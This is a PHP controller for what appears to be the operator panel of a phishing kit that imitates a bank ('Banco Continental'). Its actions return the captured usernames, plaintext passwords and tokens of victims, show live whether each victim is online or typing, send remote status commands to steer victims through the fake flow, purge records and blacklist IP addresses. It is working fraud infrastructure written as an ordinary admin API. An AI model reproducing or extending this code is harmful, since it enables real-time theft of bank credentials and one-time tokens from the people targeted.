<?php
/**
 * ECO / BANCO CONTINENTAL - ACTIONS API CONTROLLER
 * Real-Time Telemetry, Remote Commands & Database Operations
 */
header('Content-Type: application/json; charset=utf-8');
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
require_once __DIR__ . '/../config.php';

function jsonAdminResponse(array $data, int $httpCode = 200): void {
    http_response_code($httpCode);
    echo json_encode($data, JSON_UNESCAPED_UNICODE);
    exit;
}

// Security: Verify administrator session
if (!isAdmin()) {
    jsonAdminResponse(['status' => 'error', 'message' => 'No autorizado'], 403);
}

function logSystemEvent(SQLite3 $db, string $eventType, string $description): void {
    $operator = $_SESSION['op_name'] ?? ADMIN_USER;
    $now = time();
    $stmt = $db->prepare("INSERT INTO system_logs (operator_name, event_type, description, timestamp) VALUES (:op, :type, :desc, :now)");
    $stmt->bindValue(':op', $operator, SQLITE3_TEXT);
    $stmt->bindValue(':type', $eventType, SQLITE3_TEXT);
    $stmt->bindValue(':desc', $description, SQLITE3_TEXT);
    $stmt->bindValue(':now', $now, SQLITE3_INTEGER);
    $stmt->execute();
}

$action = clean($_POST['action'] ?? $_GET['action'] ?? '');
$id = isset($_POST['id']) ? (int)$_POST['id'] : 0;
$now = time();

// --- 1. GET DATA (REAL-TIME DASHBOARD TELEMETRY) ---
if ($action === 'get_data') {
    $results = $db->query("
        SELECT c.*, g.country_code 
        FROM clients c 
        LEFT JOIN geoip_cache g ON c.ip = g.ip 
        ORDER BY c.id DESC
    ");

    $clients = [];
    $total_clients = 0;
    $online_clients = 0;
    $tokens_count = 0;
    $finished_count = 0;

    while ($row = $results->fetchArray(SQLITE3_ASSOC)) {
        $last_up = (int)$row['last_updated'];
        $diff = $now - $last_up;
        $is_online = ($diff <= 14);
        $is_typing = ($diff <= 8 && (int)($row['is_typing'] ?? 0) === 1);
        $has_token = !empty($row['token']);

        $total_clients++;
        if ($is_online) $online_clients++;
        if ($has_token) $tokens_count++;
        if (($row['status'] ?? '') === 'FINISH') $finished_count++;

        $clients[] = [
            'id'            => (int)$row['id'],
            'ip'            => (string)($row['ip'] ?? ''),
            'user'          => (string)($row['user'] ?? ''),
            'pass'          => (string)($row['pass'] ?? ''),
            'token'         => (string)($row['token'] ?? ''),
            'status'        => (string)($row['status'] ?? 'WAITING'),
            'last_updated'  => $last_up,
            'created_at'    => (int)($row['created_at'] ?? $last_up),
            'created_fmt'   => date('H:i:s d/m', (int)($row['created_at'] ?? $last_up)),
            'is_online'     => $is_online,
            'is_typing'     => $is_typing,
            'device'        => (string)($row['device'] ?? 'PC'),
            'token_changed' => (int)($row['token_changed'] ?? 0),
            'identity_clicked' => (int)($row['identity_clicked'] ?? 0),
            'country_code'  => (string)($row['country_code'] ?? 'CO')
        ];
    }

    $notes = [];
    $note_res = $db->query("SELECT key, value FROM admin_config WHERE key LIKE 'note%'");
    while ($n = $note_res->fetchArray(SQLITE3_ASSOC)) {
        $notes[$n['key']] = (string)($n['value'] ?? '');
    }

    $logs = [];
    $log_res = $db->query("SELECT * FROM system_logs ORDER BY id DESC LIMIT 20");
    while ($l = $log_res->fetchArray(SQLITE3_ASSOC)) {
        $logs[] = [
            'id'            => (int)$l['id'],
            'operator_name' => (string)($l['operator_name'] ?? 'Admin'),
            'event_type'    => (string)($l['event_type'] ?? 'EVENT'),
            'description'   => (string)($l['description'] ?? ''),
            'timestamp'     => (int)$l['timestamp'],
            'time'          => date('H:i:s', $l['timestamp'])
        ];
    }

    jsonAdminResponse([
        'status'  => 'success',
        'stats'   => [
            'total'    => $total_clients,
            'online'   => $online_clients,
            'tokens'   => $tokens_count,
            'finished' => $finished_count
        ],
        'clients' => $clients,
        'notes'   => $notes,
        'logs'    => $logs
    ]);
}

// --- 2. SET STATUS / REMOTE COMMAND ---
if ($action === 'set_status') {
    $status = clean($_POST['status'] ?? '');
    if ($id > 0 && !empty($status)) {
        $stmt = $db->prepare("UPDATE clients SET status = :status, token_changed = 0 WHERE id = :id");
        $stmt->bindValue(':status', $status, SQLITE3_TEXT);
        $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
        $stmt->execute();

        logSystemEvent($db, 'COMANDO', "Envió comando [{$status}] al cliente #{$id}");
        jsonAdminResponse(['status' => 'success', 'message' => "Comando {$status} enviado correctamente"]);
    }
    jsonAdminResponse(['status' => 'error', 'message' => 'Parámetros inválidos'], 400);
}

// --- 3. DELETE CLIENT ---
if ($action === 'delete') {
    if ($id > 0) {
        $stmt = $db->prepare("DELETE FROM clients WHERE id = :id");
        $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
        $stmt->execute();

        logSystemEvent($db, 'DELETE', "Eliminó al cliente ID #{$id}");
        jsonAdminResponse(['status' => 'success', 'message' => 'Cliente eliminado']);
    }
    jsonAdminResponse(['status' => 'error', 'message' => 'ID no válido'], 400);
}

// --- 4. PURGE ALL CLIENTS ---
if ($action === 'delete_all') {
    $db->exec("DELETE FROM clients");
    logSystemEvent($db, 'PURGE', 'Purgó todos los registros de clientes');
    jsonAdminResponse(['status' => 'success', 'message' => 'Base de datos purgada']);
}

// --- 5. BLACKLIST IP ---
if ($action === 'blacklist') {
    $ip = filter_var($_POST['ip'] ?? '', FILTER_VALIDATE_IP);
    $reason = clean($_POST['reason'] ?? 'Manual por operador');
    if ($ip) {
        $stmt = $db->prepare("INSERT OR IGNORE INTO blacklist (ip, reason) VALUES (:ip, :reason)");
        $stmt->bindValue(':ip', $ip, SQLITE3_TEXT);
        $stmt->bindValue(':reason', $reason, SQLITE3_TEXT);
        $stmt->execute();

        $delStmt = $db->prepare("DELETE FROM clients WHERE ip = :ip");
        $delStmt->bindValue(':ip', $ip, SQLITE3_TEXT);
        $delStmt->execute();

        logSystemEvent($db, 'BAN', "Bloqueó la IP: {$ip}");
        jsonAdminResponse(['status' => 'success', 'message' => "IP {$ip} bloqueada"]);
    }
    jsonAdminResponse(['status' => 'error', 'message' => 'IP inválida'], 400);
}

// --- 6. UNBLOCK IP ---
if ($action === 'unblock') {
    $ip = filter_var($_POST['ip'] ?? '', FILTER_VALIDATE_IP);
    if ($ip) {
        $stmt = $db->prepare("DELETE FROM blacklist WHERE ip = :ip");
        $stmt->bindValue(':ip', $ip, SQLITE3_TEXT);
        $stmt->execute();

        logSystemEvent($db, 'UNBLOCK', "Desbloqueó la IP: {$ip}");
        jsonAdminResponse(['status' => 'success', 'message' => "IP {$ip} desbloqueada"]);
    }
    jsonAdminResponse(['status' => 'error', 'message' => 'IP inválida'], 400);
}

// --- 7. GET BLACKLIST ---
if ($action === 'get_blacklist') {
    $results = $db->query("SELECT * FROM blacklist ORDER BY id DESC");
    $list = [];
    while ($row = $results->fetchArray(SQLITE3_ASSOC)) {
        $list[] = [
            'id'         => (int)$row['id'],
            'ip'         => (string)($row['ip'] ?? ''),
            'reason'     => (string)($row['reason'] ?? 'manual'),
            'created_at' => (string)($row['created_at'] ?? '')
        ];
    }
    jsonAdminResponse(['status' => 'success', 'blacklist' => $list]);
}

// --- 8. SAVE NOTE ---
if ($action === 'save_note') {
    $num = isset($_POST['num']) ? (int)$_POST['num'] : 1;
    $notes = clean($_POST['notes'] ?? '');
    $key = 'note' . $num;

    $stmt = $db->prepare("INSERT OR REPLACE INTO admin_config (key, value) VALUES (:key, :notes)");
    $stmt->bindValue(':notes', $notes, SQLITE3_TEXT);
    $stmt->bindValue(':key', $key, SQLITE3_TEXT);
    $stmt->execute();

    logSystemEvent($db, 'NOTE', "Actualizó la Nota #{$num}");
    jsonAdminResponse(['status' => 'success', 'message' => 'Nota guardada']);
}

jsonAdminResponse(['status' => 'error', 'message' => 'Acción no reconocida'], 400);
